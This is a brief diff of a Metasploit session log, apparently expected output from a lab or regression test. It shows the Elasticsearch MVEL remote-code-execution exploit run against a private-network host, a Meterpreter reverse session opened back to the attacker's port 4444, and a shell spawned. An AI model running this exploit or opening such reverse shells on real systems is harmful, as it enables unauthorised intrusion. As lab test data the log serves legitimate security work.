@@ -6,8 +6,8 @@ spawn msfconsole -q -x use exploit/multi/elasticsearch/script_mvel_rce; set rhos
 [1m[34m[*][0m Discovering remote OS...
 [1m[32m[+][0m Remote OS is 'Linux'
 [1m[34m[*][0m Sending stage (58829 bytes) to 192.168.52.60
-[0m[1m[32m[+][0m Deleted /tmp/DVVSj.jar
-[1m[34m[*][0m Meterpreter session 1 opened (192.168.53.28:4444 -> 192.168.52.60:47302) at 2023-06-04 23:24:11 +0200
+[0m[1m[32m[+][0m Deleted /tmp/qdADVg.jar
+[1m[34m[*][0m Meterpreter session 1 opened (192.168.53.28:4444 -> 192.168.52.60:40960) at 2023-06-07 17:28:55 +0200
 
 [0m[?1034h[4mmeterpreter[0m > shell
 [0mProcess 1 created.
